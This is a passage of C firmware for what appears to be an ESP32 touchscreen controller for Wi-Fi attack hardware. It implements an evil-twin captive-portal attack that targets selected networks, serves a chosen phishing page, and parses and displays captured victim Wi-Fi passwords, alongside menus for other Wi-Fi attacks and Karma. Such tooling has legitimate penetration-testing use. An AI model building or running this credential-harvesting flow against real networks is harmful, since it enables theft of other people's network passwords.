                            char *ssid_start = connected + 18;  // Skip "connected to SSID="
                            if (*ssid_start == '\'') ssid_start++;  // Skip opening quote
                            char *ssid_end = strstr(ssid_start, "' with");
                            if (!ssid_end) ssid_end = strstr(ssid_start, " with");
                            if (ssid_end) {
                                int ssid_len = ssid_end - ssid_start;
                                if (ssid_len > 63) ssid_len = 63;
                                strncpy(captured_ssid, ssid_start, ssid_len);
                            }
                            
                            // Extract password (skip "password=" and possible quote)
                            char captured_pwd[128] = {0};
                            pwd_start += 9;  // Skip "password="
                            if (*pwd_start == '\'') pwd_start++;  // Skip opening quote
                            // Find end - either closing quote or end of line
                            int pwd_len = 0;
                            while (pwd_start[pwd_len] && pwd_start[pwd_len] != '\'' && pwd_start[pwd_len] != '\n' && pwd_start[pwd_len] != '\r') {
                                pwd_len++;
                            }
                            if (pwd_len > 127) pwd_len = 127;
                            strncpy(captured_pwd, pwd_start, pwd_len);
                            
                            ESP_LOGI(TAG, "[%s] PASSWORD CAPTURED! SSID: %s, Password: %s", uart_name, captured_ssid, captured_pwd);
                            
                            // Update UI on main thread
                            if (ctx->evil_twin_status_label) {
                                char result_text[512];
                                snprintf(result_text, sizeof(result_text),
                                    "PASSWORD CAPTURED!\n\n"
                                    "SSID: %s\n"
                                    "Password: %s",
                                    captured_ssid, captured_pwd);
                                bsp_display_lock(0);
                                lv_label_set_text(ctx->evil_twin_status_label, result_text);
                                lv_obj_set_style_text_color(ctx->evil_twin_status_label, COLOR_MATERIAL_GREEN, 0);
                                bsp_display_unlock();
                            }
                            
                            // Stop monitoring in context
                            ctx->evil_twin_monitoring = false;
                            break;
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "Evil Twin monitor task ended");
    evil_twin_monitor_task_handle = NULL;
    vTaskDelete(NULL);
}

// Evil Twin actual start logic (called from callback or SD warning continue)
static void do_evil_twin_start(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    // Use dropdowns from context instead of globals
    if (!ctx->evil_twin_network_dropdown || !ctx->evil_twin_html_dropdown) {
        ESP_LOGW(TAG, "Evil Twin dropdowns not initialized");
        return;
    }
    
    // Get selected network index from dropdown
    int selected_dropdown_idx = lv_dropdown_get_selected(ctx->evil_twin_network_dropdown);
    
    // Get selected HTML file index from dropdown
    int selected_html_idx = lv_dropdown_get_selected(ctx->evil_twin_html_dropdown);
    
    if (selected_dropdown_idx < 0 || selected_dropdown_idx >= selected_network_count) {
        ESP_LOGW(TAG, "Invalid network selection");
        return;
    }
    
    if (selected_html_idx < 0 || selected_html_idx >= evil_twin_html_count) {
        ESP_LOGW(TAG, "Invalid HTML file selection");
        return;
    }
    
    // Get the actual network index for evil twin (0-based in our array)
    int evil_twin_net_idx = selected_network_indices[selected_dropdown_idx];
    int evil_twin_1based = networks[evil_twin_net_idx].index;  // 1-based for UART
    
    // Build select_networks command: evil twin first, then others (no duplicates)
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "select_networks %d", evil_twin_1based);
    
    for (int i = 0; i < selected_network_count; i++) {
        int idx = selected_network_indices[i];
        int net_1based = networks[idx].index;
        if (net_1based != evil_twin_1based) {  // Skip duplicate
            char num[8];
            snprintf(num, sizeof(num), " %d", net_1based);
            strncat(cmd, num, sizeof(cmd) - strlen(cmd) - 1);
        }
    }
    
    ESP_LOGI(TAG, "[UART%d] Evil Twin: sending %s", uart_index_for_tab(current_tab), cmd);
    uart_send_command_for_tab(cmd);
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Send select_html command (1-based index)
    char html_cmd[32];
    snprintf(html_cmd, sizeof(html_cmd), "select_html %d", selected_html_idx + 1);
    ESP_LOGI(TAG, "[UART%d] Evil Twin: sending %s", uart_index_for_tab(current_tab), html_cmd);
    uart_send_command_for_tab(html_cmd);
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Send start_evil_twin
    ESP_LOGI(TAG, "[UART%d] Evil Twin: sending start_evil_twin", uart_index_for_tab(current_tab));
    uart_send_command_for_tab("start_evil_twin");
    
    // Build status text
    wifi_network_t *et_net = &networks[evil_twin_net_idx];
    const char *et_ssid = strlen(et_net->ssid) > 0 ? et_net->ssid : "(Hidden)";
    const char *html_file = evil_twin_html_files[selected_html_idx];
    
    char status_text[512];
    int pos = snprintf(status_text, sizeof(status_text),
        "Attacking networks:\n");
    
    for (int i = 0; i < selected_network_count; i++) {
        int idx = selected_network_indices[i];
        wifi_network_t *net = &networks[idx];
        const char *ssid = strlen(net->ssid) > 0 ? net->ssid : "(Hidden)";
        pos += snprintf(status_text + pos, sizeof(status_text) - pos,
            "  - %s (%s)\n", ssid, net->bssid);
    }
    
    pos += snprintf(status_text + pos, sizeof(status_text) - pos,
        "\nEvil Twin network: %s\n"
        "Portal: %s\n\n"
        "Waiting for victim to connect...",
        et_ssid, html_file);
    
    // Update status label in context (not global)
    if (ctx->evil_twin_status_label) {
        lv_label_set_text(ctx->evil_twin_status_label, status_text);
    }
    
    // Start monitoring task
    evil_twin_monitoring = true;
    ctx->evil_twin_monitoring = true;
    
    xTaskCreate(evil_twin_monitor_task, "et_monitor", 4096, (void*)ctx, 5, &evil_twin_monitor_task_handle);
}

// Evil Twin start button callback
static void evil_twin_start_cb(lv_event_t *e)
{
    (void)e;
    // SD check is done before opening popup, so we can start directly
    do_evil_twin_start();
}

// Show Evil Twin popup with dropdowns
static void show_evil_twin_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->evil_twin_popup != NULL) return;  // Already showing in this tab
    
    // Show loading overlay while fetching HTML files
    show_evil_twin_loading_overlay();
    lv_refr_now(NULL);  // Force immediate UI refresh to show overlay
    
    // Fetch HTML files from SD (this takes a few seconds)
    fetch_html_files_from_sd();
    
    // Hide loading overlay
    hide_evil_twin_loading_overlay();
    
    if (evil_twin_html_count == 0) {
        ESP_LOGW(TAG, "No HTML files found on SD card");
        // Could show an error message here
        return;
    }
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay (fills container, semi-transparent, blocks input behind)
    ctx->evil_twin_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->evil_twin_overlay);
    lv_obj_set_size(ctx->evil_twin_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->evil_twin_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->evil_twin_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->evil_twin_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->evil_twin_overlay, LV_OBJ_FLAG_CLICKABLE);  // Capture clicks
    
    // Create popup as child of overlay
    ctx->evil_twin_popup = lv_obj_create(ctx->evil_twin_overlay);
    lv_obj_set_size(ctx->evil_twin_popup, 600, 550);
    lv_obj_center(ctx->evil_twin_popup);
    lv_obj_set_style_bg_color(ctx->evil_twin_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->evil_twin_popup, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(ctx->evil_twin_popup, 2, 0);
    lv_obj_set_style_radius(ctx->evil_twin_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->evil_twin_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->evil_twin_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->evil_twin_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->evil_twin_popup, 16, 0);
    lv_obj_set_flex_flow(ctx->evil_twin_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->evil_twin_popup, 12, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(ctx->evil_twin_popup);
    lv_label_set_text(title, "Evil Twin Attack");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // Network dropdown container
    lv_obj_t *net_cont = lv_obj_create(ctx->evil_twin_popup);
    lv_obj_set_size(net_cont, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(net_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(net_cont, 0, 0);
    lv_obj_set_style_pad_all(net_cont, 0, 0);
    lv_obj_set_flex_flow(net_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(net_cont, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(net_cont, 10, 0);
    lv_obj_clear_flag(net_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *net_label = lv_label_create(net_cont);
    lv_label_set_text(net_label, "Evil Twin Network:");
    lv_obj_set_style_text_font(net_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(net_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_set_width(net_label, 180);
    
    ctx->evil_twin_network_dropdown = lv_dropdown_create(net_cont);
    lv_obj_set_width(ctx->evil_twin_network_dropdown, 350);
    lv_obj_set_style_bg_color(ctx->evil_twin_network_dropdown, lv_color_hex(0x2D2D2D), 0);
    lv_obj_set_style_text_color(ctx->evil_twin_network_dropdown, lv_color_hex(0xFFFFFF), 0);
    lv_obj_set_style_border_color(ctx->evil_twin_network_dropdown, lv_color_hex(0x555555), 0);
    
    // Build network dropdown options from selected networks
    char network_options[1024] = "";
    for (int i = 0; i < selected_network_count; i++) {
        int idx = selected_network_indices[i];
        if (idx >= 0 && idx < network_count) {
            const char *ssid = strlen(networks[idx].ssid) > 0 ? networks[idx].ssid : "(Hidden)";
            if (i > 0) strncat(network_options, "\n", sizeof(network_options) - strlen(network_options) - 1);
            strncat(network_options, ssid, sizeof(network_options) - strlen(network_options) - 1);
        }
    }
    lv_dropdown_set_options(ctx->evil_twin_network_dropdown, network_options);
    
    // Style dropdown list (dark background when opened)
    lv_obj_t *net_list = lv_dropdown_get_list(ctx->evil_twin_network_dropdown);
    if (net_list) {
        lv_obj_set_style_bg_color(net_list, lv_color_hex(0x2D2D2D), 0);
        lv_obj_set_style_text_color(net_list, lv_color_hex(0xFFFFFF), 0);
        lv_obj_set_style_border_color(net_list, lv_color_hex(0x555555), 0);
    }
    
    // HTML dropdown container
    lv_obj_t *html_cont = lv_obj_create(ctx->evil_twin_popup);
    lv_obj_set_size(html_cont, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(html_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(html_cont, 0, 0);
    lv_obj_set_style_pad_all(html_cont, 0, 0);
    lv_obj_set_flex_flow(html_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(html_cont, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(html_cont, 10, 0);
    lv_obj_clear_flag(html_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *html_label = lv_label_create(html_cont);
    lv_label_set_text(html_label, "Portal HTML:");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(html_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_set_width(html_label, 180);
    
    ctx->evil_twin_html_dropdown = lv_dropdown_create(html_cont);
    lv_obj_set_width(ctx->evil_twin_html_dropdown, 350);
    lv_obj_set_style_bg_color(ctx->evil_twin_html_dropdown, lv_color_hex(0x2D2D2D), 0);
    lv_obj_set_style_text_color(ctx->evil_twin_html_dropdown, lv_color_hex(0xFFFFFF), 0);
    lv_obj_set_style_border_color(ctx->evil_twin_html_dropdown, lv_color_hex(0x555555), 0);
    
    // Build HTML dropdown options
    char html_options[2048] = "";
    for (int i = 0; i < evil_twin_html_count; i++) {
        if (i > 0) strncat(html_options, "\n", sizeof(html_options) - strlen(html_options) - 1);
        strncat(html_options, evil_twin_html_files[i], sizeof(html_options) - strlen(html_options) - 1);
    }
    lv_dropdown_set_options(ctx->evil_twin_html_dropdown, html_options);
    
    // Style dropdown list (dark background when opened)
    lv_obj_t *html_list = lv_dropdown_get_list(ctx->evil_twin_html_dropdown);
    if (html_list) {
        lv_obj_set_style_bg_color(html_list, lv_color_hex(0x2D2D2D), 0);
        lv_obj_set_style_text_color(html_list, lv_color_hex(0xFFFFFF), 0);
        lv_obj_set_style_border_color(html_list, lv_color_hex(0x555555), 0);
    }
    
    // START ATTACK button
    lv_obj_t *start_btn = lv_btn_create(ctx->evil_twin_popup);
    lv_obj_set_size(start_btn, lv_pct(100), 50);
    lv_obj_set_style_bg_color(start_btn, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_bg_color(start_btn, lv_color_hex(0xCC7000), LV_STATE_PRESSED);
    lv_obj_set_style_radius(start_btn, 8, 0);
    lv_obj_add_event_cb(start_btn, evil_twin_start_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *start_label = lv_label_create(start_btn);
    lv_label_set_text(start_label, "START ATTACK");
    lv_obj_set_style_text_font(start_label, &lv_font_montserrat_18, 0);
    lv_obj_center(start_label);
    
    // Status label (scrollable area)
    lv_obj_t *status_cont = lv_obj_create(ctx->evil_twin_popup);
    lv_obj_set_size(status_cont, lv_pct(100), 200);
    lv_obj_set_style_bg_color(status_cont, lv_color_hex(0x0A0A1A), 0);
    lv_obj_set_style_border_width(status_cont, 0, 0);
    lv_obj_set_style_radius(status_cont, 8, 0);
    lv_obj_set_style_pad_all(status_cont, 12, 0);
    lv_obj_add_flag(status_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    ctx->evil_twin_status_label = lv_label_create(status_cont);
    lv_label_set_text(ctx->evil_twin_status_label, "Select network and portal, then click START ATTACK");
    lv_obj_set_style_text_font(ctx->evil_twin_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ctx->evil_twin_status_label, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_width(ctx->evil_twin_status_label, lv_pct(100));
    lv_label_set_long_mode(ctx->evil_twin_status_label, LV_LABEL_LONG_WRAP);
    
    // CLOSE button (hidden initially, shown when password captured)
    lv_obj_t *close_btn = lv_btn_create(ctx->evil_twin_popup);
    lv_obj_set_size(close_btn, lv_pct(100), 50);
    lv_obj_set_style_bg_color(close_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_bg_color(close_btn, lv_color_hex(0x2E7D32), LV_STATE_PRESSED);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_add_event_cb(close_btn, evil_twin_close_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_add_flag(close_btn, LV_OBJ_FLAG_HIDDEN);  // Hidden initially
    
    lv_obj_t *et_close_label = lv_label_create(close_btn);
    lv_label_set_text(et_close_label, "CLOSE");
    lv_obj_set_style_text_font(et_close_label, &lv_font_montserrat_18, 0);
    lv_obj_center(et_close_label);
    
    // STOP button (always visible - sends stop command and closes popup)
    lv_obj_t *stop_btn = lv_btn_create(ctx->evil_twin_popup);  // Use ctx->evil_twin_popup!
    lv_obj_set_size(stop_btn, lv_pct(100), 50);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(stop_btn, lv_color_hex(0xB71C1C), LV_STATE_PRESSED);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_add_event_cb(stop_btn, evil_twin_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, "STOP");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_18, 0);
    lv_obj_center(stop_label);
}

// Back button click handler - hide current page and show tiles
static void back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Back button clicked, returning to tiles for tab %d", current_tab);
    
    // Get current tab's data
    tab_context_t *ctx = get_current_ctx();
    
    // Hide current page
    if (ctx->current_visible_page) {
        lv_obj_add_flag(ctx->current_visible_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show tiles
    if (ctx->tiles) {
        lv_obj_clear_flag(ctx->tiles, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->tiles;
    }
}

// Create tiles for UART tabs inside given container
static void create_uart_tiles_in_container(lv_obj_t *container, lv_obj_t **tiles_ptr)
{
    if (*tiles_ptr) {
        // Tiles already exist, just show them
        lv_obj_clear_flag(*tiles_ptr, LV_OBJ_FLAG_HIDDEN);
        return;
    }
    
    *tiles_ptr = lv_obj_create(container);
    lv_obj_set_size(*tiles_ptr, lv_pct(100), lv_pct(100));
    lv_obj_align(*tiles_ptr, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(*tiles_ptr, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(*tiles_ptr, 0, 0);
    lv_obj_set_style_radius(*tiles_ptr, 0, 0);
    lv_obj_set_style_pad_all(*tiles_ptr, 20, 0);
    lv_obj_set_style_pad_gap(*tiles_ptr, 20, 0);
    lv_obj_set_flex_flow(*tiles_ptr, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(*tiles_ptr, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(*tiles_ptr, LV_OBJ_FLAG_SCROLLABLE);
    
    // Create 7 tiles for device tabs (same for Grove, USB, MBus)
    // Use "Test" instead of "Attack" when Red Team is disabled
    create_tile(*tiles_ptr, LV_SYMBOL_WIFI, 
        enable_red_team ? "WiFi Scan\n& Attack" : "WiFi Scan\n& Test", 
        COLOR_MATERIAL_BLUE, main_tile_event_cb, "WiFi Scan & Attack");
    create_tile(*tiles_ptr, LV_SYMBOL_WARNING, 
        enable_red_team ? "Global WiFi\nAttacks" : "Global WiFi\nTests", 
        COLOR_MATERIAL_RED, main_tile_event_cb, "Global WiFi Attacks");
    create_tile(*tiles_ptr, LV_SYMBOL_SAVE, "Compromised\nData", COLOR_MATERIAL_GREEN, main_tile_event_cb, "Compromised Data");
    create_tile(*tiles_ptr, LV_SYMBOL_EYE_OPEN, "Deauth\nDetector", COLOR_MATERIAL_AMBER, main_tile_event_cb, "Deauth Detector");
    create_tile(*tiles_ptr, LV_SYMBOL_BLUETOOTH, "Bluetooth", COLOR_MATERIAL_CYAN, main_tile_event_cb, "Bluetooth");
    create_tile(*tiles_ptr, LV_SYMBOL_LOOP, "Network\nObserver", COLOR_MATERIAL_TEAL, main_tile_event_cb, "Network Observer");
    create_tile(*tiles_ptr, LV_SYMBOL_WIFI, "Karma", COLOR_MATERIAL_ORANGE, main_tile_event_cb, "Karma");
    
    // Ensure tiles are visible after creation (fixes initial display issue)
    lv_obj_clear_flag(*tiles_ptr, LV_OBJ_FLAG_HIDDEN);
}

// Show UART 1 tiles (inside persistent container)
static void show_uart1_tiles(void)
{
    ESP_LOGI(TAG, "Showing %s tiles", tab_transport_name(current_tab));
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) {
        ESP_LOGE(TAG, "%s container not initialized!", tab_transport_name(current_tab));
        return;
    }
    
    // Hide other pages in this container, show tiles
    tab_context_t *ctx = get_current_ctx();
    if (ctx->scan_page) lv_obj_add_flag(ctx->scan_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->observer_page) lv_obj_add_flag(ctx->observer_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->global_attacks_page) lv_obj_add_flag(ctx->global_attacks_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->karma_page) lv_obj_add_flag(ctx->karma_page, LV_OBJ_FLAG_HIDDEN);
    
    create_uart_tiles_in_container(container, &ctx->tiles);
    ctx->current_visible_page = ctx->tiles;
}

// Show UART 2 tiles (inside persistent container)
static void show_mbus_tiles(void)
{
    ESP_LOGI(TAG, "Showing UART 2 tiles");
    
    if (!mbus_container) {
        ESP_LOGE(TAG, "MBus container not initialized!");
        return;
    }
    
    // Hide other pages in this container, show tiles
    tab_context_t *ctx = &mbus_ctx;
    if (ctx->scan_page) lv_obj_add_flag(ctx->scan_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->observer_page) lv_obj_add_flag(ctx->observer_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->global_attacks_page) lv_obj_add_flag(ctx->global_attacks_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->karma_page) lv_obj_add_flag(ctx->karma_page, LV_OBJ_FLAG_HIDDEN);
    
    create_uart_tiles_in_container(mbus_container, &ctx->tiles);
    ctx->current_visible_page = ctx->tiles;
}

// Internal tab tile click handler
static void internal_tile_event_cb(lv_event_t *e)
{
    const char *tile_name = (const char *)lv_event_get_user_data(e);
    ESP_LOGI(TAG, "Internal tile clicked: %s", tile_name);
    
    if (strcmp(tile_name, "Settings") == 0) {
        show_settings_page();
    } else if (strcmp(tile_name, "Ad Hoc Portal") == 0) {
        // Show Ad Hoc Portal page (with portal status or probe selection)
        show_adhoc_portal_page();
    }
}

// Show INTERNAL tiles (Settings, Ad Hoc Portal) inside persistent container
static void show_internal_tiles(void)
{
    ESP_LOGI(TAG, "Showing INTERNAL tiles");
    
    if (!internal_container) {
        ESP_LOGE(TAG, "INTERNAL container not initialized!");
        return;
    }
    
    // Hide settings page if visible, show tiles
    if (internal_settings_page) lv_obj_add_flag(internal_settings_page, LV_OBJ_FLAG_HIDDEN);
    
    if (internal_tiles) {
        // Already exists, just show it
        lv_obj_clear_flag(internal_tiles, LV_OBJ_FLAG_HIDDEN);
        return;
    }
    
    // Create tiles inside internal container
    internal_tiles = lv_obj_create(internal_container);
    lv_obj_set_size(internal_tiles, lv_pct(100), lv_pct(100));
    lv_obj_align(internal_tiles, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(internal_tiles, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(internal_tiles, 0, 0);
    lv_obj_set_style_radius(internal_tiles, 0, 0);
    lv_obj_set_style_pad_all(internal_tiles, 20, 0);
    lv_obj_set_style_pad_gap(internal_tiles, 20, 0);
    lv_obj_set_flex_flow(internal_tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(internal_tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(internal_tiles, LV_OBJ_FLAG_SCROLLABLE);
    
    // Create 2 tiles for INTERNAL tab
    create_tile(internal_tiles, LV_SYMBOL_SETTINGS, "Settings", COLOR_MATERIAL_PURPLE, internal_tile_event_cb, "Settings");
    create_tile(internal_tiles, LV_SYMBOL_WIFI, "Ad Hoc\nPortal & Karma", COLOR_MATERIAL_ORANGE, internal_tile_event_cb, "Ad Hoc Portal");
    
    // Ensure tiles are visible after creation (fixes initial display issue)
    lv_obj_clear_flag(internal_tiles, LV_OBJ_FLAG_HIDDEN);
}

// Show main tiles screen with tab bar (persistent containers)
static void show_main_tiles(void)
{
    lv_obj_t *scr = lv_scr_act();
    
    // Set dark background
    lv_obj_set_style_bg_color(scr, COLOR_MATERIAL_BG, 0);
    
    // Create status bar and tab bar
    create_status_bar();
    create_tab_bar();
    update_portal_icon();
    
    // Create persistent tab containers (only once)
    // Check internal_container since it's always created
    if (!internal_container) {
        create_tab_containers();
        update_tab_styles();  // Apply styles after current_tab is set
    } else {
        // Containers might be missing if detection changed after first create
        // Create any missing containers for newly detected devices
        lv_coord_t height = lv_disp_get_ver_res(NULL) - 85;
        
        if (grove_detected && !grove_container) {
            grove_container = lv_obj_create(scr);
            lv_obj_set_size(grove_container, lv_pct(100), height);
            lv_obj_align(grove_container, LV_ALIGN_TOP_MID, 0, 85);
            lv_obj_set_style_bg_color(grove_container, COLOR_MATERIAL_BG, 0);
            lv_obj_set_style_border_width(grove_container, 0, 0);
            lv_obj_set_style_radius(grove_container, 0, 0);
            lv_obj_set_style_pad_all(grove_container, 0, 0);
            lv_obj_clear_flag(grove_container, LV_OBJ_FLAG_SCROLLABLE);
            lv_obj_add_flag(grove_container, LV_OBJ_FLAG_HIDDEN);
            ESP_LOGI(TAG, "Late-created Grove container");
        }
        
        if (usb_detected && !usb_container) {
            usb_container = lv_obj_create(scr);
            lv_obj_set_size(usb_container, lv_pct(100), height);
            lv_obj_align(usb_container, LV_ALIGN_TOP_MID, 0, 85);
            lv_obj_set_style_bg_color(usb_container, COLOR_MATERIAL_BG, 0);
            lv_obj_set_style_border_width(usb_container, 0, 0);
            lv_obj_set_style_radius(usb_container, 0, 0);
            lv_obj_set_style_pad_all(usb_container, 0, 0);
            lv_obj_clear_flag(usb_container, LV_OBJ_FLAG_SCROLLABLE);
            lv_obj_add_flag(usb_container, LV_OBJ_FLAG_HIDDEN);
            ESP_LOGI(TAG, "Late-created USB container");
        }
        
        if (mbus_detected && !mbus_container) {
            mbus_container = lv_obj_create(scr);
            lv_obj_set_size(mbus_container, lv_pct(100), height);
            lv_obj_align(mbus_container, LV_ALIGN_TOP_MID, 0, 85);
            lv_obj_set_style_bg_color(mbus_container, COLOR_MATERIAL_BG, 0);
            lv_obj_set_style_border_width(mbus_container, 0, 0);
            lv_obj_set_style_radius(mbus_container, 0, 0);
            lv_obj_set_style_pad_all(mbus_container, 0, 0);
            lv_obj_clear_flag(mbus_container, LV_OBJ_FLAG_SCROLLABLE);
            lv_obj_add_flag(mbus_container, LV_OBJ_FLAG_HIDDEN);
            ESP_LOGI(TAG, "Late-created MBus container");
        }
    }
    
    // Show tiles for current tab and make container visible
    lv_obj_t *current_container = get_current_tab_container();
    if (current_container) {
        lv_obj_clear_flag(current_container, LV_OBJ_FLAG_HIDDEN);
    }

    if (tab_is_internal(current_tab)) {
        show_internal_tiles();
    } else if (tab_is_mbus(current_tab)) {
        show_mbus_tiles();
    } else {
        show_uart1_tiles();
    }
}

// Show WiFi Scanner page with Back button (inside current tab's container)
static void show_scan_page(void)
{
    // Get current tab's data and container
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // If scan page already exists for this tab, just show it
    if (ctx->scan_page) {
        lv_obj_clear_flag(ctx->scan_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->scan_page;
        ESP_LOGI(TAG, "Showing existing scan page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new scan page for tab %d", current_tab);
    
    // Create scan page container inside tab container
    ctx->scan_page = lv_obj_create(container);
    scan_page = ctx->scan_page;  // Keep legacy reference for compatibility
    lv_obj_set_size(scan_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(scan_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(scan_page, 0, 0);
    lv_obj_set_style_pad_all(scan_page, 4, 0);  // Minimal padding for maximum list space
    lv_obj_set_flex_flow(scan_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(scan_page, 2, 0);  // Minimal gap
    
    // Header container
    lv_obj_t *header = lv_obj_create(scan_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // Left side: Back button + Title
    lv_obj_t *left_cont = lv_obj_create(header);
    lv_obj_set_size(left_cont, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(left_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(left_cont, 0, 0);
    lv_obj_set_style_pad_all(left_cont, 0, 0);
    lv_obj_set_flex_flow(left_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(left_cont, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(left_cont, 12, 0);
    
    // Back button
    lv_obj_t *back_btn = lv_btn_create(left_cont);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title - use "Test" instead of "Attack" when Red Team is disabled
    lv_obj_t *title = lv_label_create(left_cont);
    lv_label_set_text(title, enable_red_team ? "Scan & Attack" : "Scan & Test");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_BLUE, 0);
    
    // Scan button container (for button + spinner)
    lv_obj_t *btn_cont = lv_obj_create(header);
    lv_obj_set_size(btn_cont, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
